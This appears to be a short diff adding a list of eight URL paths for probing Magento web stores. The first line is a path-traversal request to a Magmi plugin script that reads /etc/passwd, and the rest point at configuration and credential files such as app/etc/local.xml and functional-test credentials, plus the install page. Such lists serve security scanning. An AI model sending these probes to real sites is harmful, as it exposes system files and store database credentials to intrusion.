@@ -1,0 +1,8 @@
+/magmi/web/ajax_pluginconf.php?file=../../../../../../../../../../../etc/passwd&plugintype=utilities&pluginclass=CustomSQLUtility
+/var/resource_config.json
+/app/etc/local.xml
+/app/etc/local.xml.additional
+/store/app/etc/local.xml
+/index.php/install/
+/dev/tests/functional/credentials.xml.dist
+/dev/tests/functional/etc/config.xml.dist
